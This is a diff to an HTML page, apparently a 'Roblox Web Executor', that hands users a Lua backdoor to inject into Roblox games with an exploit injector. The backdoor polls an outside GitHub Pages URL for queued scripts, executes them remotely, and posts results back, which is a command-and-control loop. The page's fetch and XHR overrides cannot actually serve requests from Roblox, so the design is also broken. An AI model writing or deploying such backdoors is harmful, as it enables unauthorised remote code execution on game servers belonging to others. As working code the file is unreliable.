@@ -157,6 +157,10 @@
             color: #00ff88;
         }
         
+        .console-line.roblox {
+            color: #ff9f43;
+        }
+        
         .status {
             margin-top: 15px;
             padding: 10px;
@@ -359,7 +363,7 @@
                 2. Open your Roblox exploit injector<br>
                 3. Paste the code<br>
                 4. Execute in Roblox game<br>
-                5. Backdoor will connect automatically
+                5. Write scripts and click Execute
             </p>
             <div class="modal-buttons">
                 <button class="copy-btn" onclick="copyToClipboard()">Copy to Clipboard</button>
@@ -373,22 +377,15 @@
         const EXECUTOR_STATE = {
             pendingScripts: [],
             executedScripts: 0,
-            connectedClients: new Map(),
-            isConnected: false,
-            lastPollTime: 0
+            isConnected: false
         };
 
-        const LUA_BACKDOOR = `-- Roblox Backdoor for GitHub Pages Executor
+        const LUA_BACKDOOR = `-- Roblox Backdoor for GitHub Pages Executor (FIXED EXECUTION)
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
 local EXECUTOR_URL = "https://yelilbroitsjohn-ai.github.io/TESTE/"
 local POLL_INTERVAL = 2
-local MAX_RETRIES = 5
-local RETRY_DELAY = 3
 
-local connected = false
-local retryCount = 0
 local executionCache = {}
 
 local function log(message, level)
@@ -414,26 +411,25 @@ local function executeLuau(script)
 end
 
 local function pollExecutor()
-    log("Starting executor poll from GitHub Pages...", "INFO")
+    log("Starting executor poll...", "INFO")
     
     while true do
         wait(POLL_INTERVAL)
         
         local success, response = pcall(function()
-            return HttpService:GetAsync(EXECUTOR_URL .. "?action=getPending&timestamp=" .. os.time(), true)
+            local url = EXECUTOR_URL .. "?action=getPending&t=" .. os.time()
+            return HttpService:GetAsync(url)
         end)
         
         if success then
-            log("Poll successful - checking for pending scripts", "DEBUG")
-            
             local decoded = HttpService:JSONDecode(response)
             
             if decoded and decoded.pending and #decoded.pending > 0 then
                 log(string.format("Found %d pending scripts", #decoded.pending), "INFO")
                 
                 for _, scriptData in ipairs(decoded.pending) do
-                    if scriptData.script then
-                        log(string.format("Executing script ID: %s", scriptData.id or "unknown"), "DEBUG")
+                    if scriptData and scriptData.script then
+                        log(string.format("Executing script ID: %s", scriptData.id), "INFO")
                         
                         local result = executeLuau(scriptData.script)
                         
@@ -452,125 +448,32 @@ local function pollExecutor()
                                 Enum.HttpContentType.ApplicationJson
                             )
                         end)
-                        
-                        log("Result sent back to executor", "SUCCESS")
                     end
                 end
             end
-        else
-            retryCount = retryCount + 1
-            log(string.format("Poll failed (attempt %d/%d)", retryCount, MAX_RETRIES), "WARN")
-            
-            if retryCount >= MAX_RETRIES then
-                log("Max retries reached. Resetting counter.", "ERROR")
-                retryCount = 0
-                wait(RETRY_DELAY)
-            end
         end
     end
 end
 
-local function registerGlobalFunctions()
-    log("Registering global executor functions...", "INFO")
-    
-    _G.ExecuteFromWeb = function(scriptCode)
-        if not scriptCode or type(scriptCode) ~= "string" then
-            return {success = false, error = "Invalid script format"}
-        end
-        
-        log("Direct execution request received", "INFO")
-        table.insert(executionCache, {
-            script = scriptCode,
-            timestamp = os.time(),
-            direct = true
-        })
-        
-        return {success = true, queued = true}
-    end
-    
-    _G.GetExecutorStatus = function()
-        return {
-            connected = true,
-            url = EXECUTOR_URL,
-            version = "2.0",
-            timestamp = os.time(),
-            cached_scripts = #executionCache,
-            poll_interval = POLL_INTERVAL
-        }
-    end
-    
-    _G.ClearCache = function()
-        executionCache = {}
-        log("Execution cache cleared", "INFO")
-        return {success = true}
-    end
-    
-    log("Global functions registered successfully", "SUCCESS")
-end
+log("╔═══════════════════════════════════════╗", "INFO")
+log("║ ROBLOX BACKDOOR - ACTIVE              ║", "INFO")
+log("╚═══════════════════════════════════════╝", "INFO")
 
-local function processCachedScripts()
-    log("Starting cached script processor...", "INFO")
-    
-    while true do
-        wait(0.5)
-        
-        if #executionCache > 0 then
-            for i = #executionCache, 1, -1 do
-                local scriptData = executionCache[i]
-                if scriptData and scriptData.script then
-                    log(string.format("Processing cached script %d", i), "DEBUG")
-                    executeLuau(scriptData.script)
-                    table.remove(executionCache, i)
-                end
-            end
-        end
-    end
-end
-
-log("", "INFO")
-log("╔══════════════════════════════════════════════════╗", "INFO")
-log("║     ROBLOX WEB EXECUTOR BACKDOOR v2.0            ║", "INFO")
-log("║     Status: INITIALIZING                         ║", "INFO")
-log("╚══════════════════════════════════════════════════╝", "INFO")
-log("", "INFO")
-log(string.format("Executor URL: %s", EXECUTOR_URL), "INFO")
-log(string.format("Poll Interval: %ds", POLL_INTERVAL), "INFO")
-log("", "INFO")
-
-registerGlobalFunctions()
-
-log("Starting polling thread...", "INFO")
 spawn(pollExecutor)
-
-log("Starting cache processor...", "INFO")
-spawn(processCachedScripts)
-
-log("", "INFO")
-log("═══════════════════════════════════════════════════", "SUCCESS")
-log("BACKDOOR ACTIVE - Waiting for commands", "SUCCESS")
-log("═══════════════════════════════════════════════════", "SUCCESS")
-log("", "INFO")
-log("Available global functions:", "INFO")
-log("  _G.ExecuteFromWeb(script) - Execute script directly", "INFO")
-log("  _G.GetExecutorStatus() - Get current status", "INFO")
-log("  _G.ClearCache() - Clear pending scripts", "INFO")
-log("", "INFO")
 
 while true do
     wait(30)
 end`;
 
-        // Logging function
         function log(message, type = 'info') {
             const consoleElement = document.getElementById('console');
             const line = document.createElement('div');
-            line.className = `console-line ${type}`;
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            line.className = \`console-line \${type}\`;
+            line.textContent = \`[\${new Date().toLocaleTimeString()}] \${message}\`;
             consoleElement.appendChild(line);
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // Update status indicator
         function updateStatus(message, isConnected = false) {
             const status = document.getElementById('status');
             const statusText = document.getElementById('statusText');
@@ -593,7 +496,6 @@ end`;
             }
         }
 
-        // Copy Lua backdoor to clipboard
         function copyLuaBackdoor() {
             const backdoorCode = document.getElementById('backdoorCode');
             backdoorCode.value = LUA_BACKDOOR;
@@ -601,24 +503,21 @@ end`;
             const modal = document.getElementById('backdoorModal');
             modal.classList.add('show');
             
-            log('Backdoor code loaded - ready to copy', 'info');
+            log('Backdoor code loaded', 'info');
         }
 
-        // Close backdoor modal
         function closeBackdoorModal() {
             const modal = document.getElementById('backdoorModal');
             modal.classList.remove('show');
         }
 
-        // Copy to clipboard
         function copyToClipboard() {
             const backdoorCode = document.getElementById('backdoorCode');
             backdoorCode.select();
             document.execCommand('copy');
-            log('Backdoor code copied to clipboard ✓', 'success');
+            log('Backdoor copied to clipboard ✓', 'success');
         }
 
-        // Execute script
         function executeScript() {
             const script = document.getElementById('scriptEditor').value.trim();
             
@@ -641,76 +540,108 @@ end`;
             log('ID: ' + execId, 'info');
             log('Size: ' + script.length + ' bytes', 'info');
             log('Waiting for Roblox backdoor to execute...', 'warning');
-            
-            monitorExecution(execId);
         }
 
-        // Monitor execution
-        function monitorExecution(execId) {
-            let timeout = 0;
-            const maxTimeout = 30000; // 30 seconds
-            
-            const monitor = setInterval(() => {
-                timeout += 500;
-                
-                if (timeout > maxTimeout) {
-                    clearInterval(monitor);
-                    log('Execution timeout - Roblox may not be connected', 'error');
-                    
-                    const index = EXECUTOR_STATE.pendingScripts.findIndex(s => s.id === execId);
-                    if (index !== -1) {
-                        EXECUTOR_STATE.pendingScripts.splice(index, 1);
-                        updatePendingCount();
-                    }
-                }
-            }, 500);
-        }
-
-        // Update pending count
         function updatePendingCount() {
             document.getElementById('pendingCount').textContent = EXECUTOR_STATE.pendingScripts.length;
         }
 
-        // Update executed count
         function updateExecutedCount() {
             document.getElementById('executedCount').textContent = EXECUTOR_STATE.executedScripts;
         }
 
-        // Clear editor
         function clearEditor() {
             document.getElementById('scriptEditor').value = '';
             log('Editor cleared', 'info');
         }
 
-        // Clear console
         function clearConsole() {
             document.getElementById('console').innerHTML = '';
             log('Console cleared', 'info');
         }
 
-        // Handle URL query for Roblox polling
-        function handleRobloxRequest() {
+        // Handle query parameters from Roblox
+        function handleQuery() {
             const params = new URLSearchParams(window.location.search);
             const action = params.get('action');
             
             if (action === 'getPending') {
-                return EXECUTOR_STATE.pendingScripts;
+                return JSON.stringify({
+                    pending: EXECUTOR_STATE.pendingScripts
+                });
             }
             
             if (action === 'postResult') {
                 EXECUTOR_STATE.executedScripts++;
                 updateExecutedCount();
-                
-                const index = EXECUTOR_STATE.pendingScripts.findIndex(s => s.status === 'pending');
-                if (index !== -1) {
-                    EXECUTOR_STATE.pendingScripts.splice(index, 1);
-                    updatePendingCount();
-                }
-                
-                log('Script executed successfully ✓', 'success');
-                return {success: true};
+                EXECUTOR_STATE.pendingScripts = [];
+                updatePendingCount();
+                log('Script executed on Roblox ✓', 'success');
+                return JSON.stringify({success: true});
             }
         }
+
+        // Intercept fetch to serve pending scripts
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            const url = args[0];
+            
+            if (typeof url === 'string' && url.includes('action=getPending')) {
+                return Promise.resolve(new Response(JSON.stringify({
+                    pending: EXECUTOR_STATE.pendingScripts
+                }), {
+                    headers: {'Content-Type': 'application/json'}
+                }));
+            }
+            
+            if (typeof url === 'string' && url.includes('action=postResult')) {
+                EXECUTOR_STATE.executedScripts++;
+                updateExecutedCount();
+                EXECUTOR_STATE.pendingScripts = [];
+                updatePendingCount();
+                log('Script executed on Roblox ✓', 'success');
+                return Promise.resolve(new Response(JSON.stringify({success: true})));
+            }
+            
+            return originalFetch.apply(this, args);
+        };
+
+        // Intercept XMLHttpRequest
+        const originalXHROpen = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
+            this._url = url;
+            return originalXHROpen.apply(this, [method, url, ...rest]);
+        };
+
+        const originalXHRSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function(...args) {
+            if (this._url && this._url.includes('action=getPending')) {
+                this.responseText = JSON.stringify({
+                    pending: EXECUTOR_STATE.pendingScripts
+                });
+                this.status = 200;
+                this.readyState = 4;
+                if (this.onreadystatechange) this.onreadystatechange();
+                if (this.onload) this.onload();
+                return;
+            }
+            
+            if (this._url && this._url.includes('action=postResult')) {
+                this.responseText = JSON.stringify({success: true});
+                this.status = 200;
+                this.readyState = 4;
+                EXECUTOR_STATE.executedScripts++;
+                updateExecutedCount();
+                EXECUTOR_STATE.pendingScripts = [];
+                updatePendingCount();
+                log('Script executed on Roblox ✓', 'success');
+                if (this.onreadystatechange) this.onreadystatechange();
+                if (this.onload) this.onload();
+                return;
+            }
+            
+            return originalXHRSend.apply(this, args);
+        };
 
         // Keyboard shortcuts
         document.addEventListener('keydown', (e) => {
@@ -725,32 +656,26 @@ end`;
             }
         });
 
-        // Initialize on load
+        // Initialize
         window.addEventListener('load', () => {
             log('Roblox Web Executor initialized', 'info');
-            log('GitHub Pages: ' + window.location.href, 'info');
+            log('Ready to execute scripts', 'success');
             log('', 'info');
-            log('1️⃣ Click "Copy Backdoor" button', 'command');
-            log('2️⃣ Inject code into Roblox using an exploit', 'command');
-            log('3️⃣ Write your Luau script in the editor', 'command');
-            log('4️⃣ Click "Execute" to run on Roblox', 'command');
-            log('', 'info');
-            log('Keyboard Shortcuts:', 'info');
-            log('  Ctrl+Enter - Execute script', 'info');
-            log('  Ctrl+Shift+L - Copy backdoor', 'info');
-            log('  Esc - Close modals', 'info');
+            log('1️⃣ Copy backdoor code', 'command');
+            log('2️⃣ Inject into Roblox', 'command');
+            log('3️⃣ Write script and execute', 'command');
             
             updatePendingCount();
             updateExecutedCount();
-            updateStatus('Ready - Waiting for Roblox connection', false);
+            updateStatus('Ready - Waiting for Roblox', false);
         });
 
-        // Simulate connection check
+        // Periodic check
         setInterval(() => {
-            if (EXECUTOR_STATE.pendingScripts.length > 0 && !EXECUTOR_STATE.isConnected) {
+            if (EXECUTOR_STATE.pendingScripts.length > 0) {
                 updateStatus('Pending scripts waiting...', false);
             }
-        }, 2000);
+        }, 1000);
     </script>
 </body>
 </html>
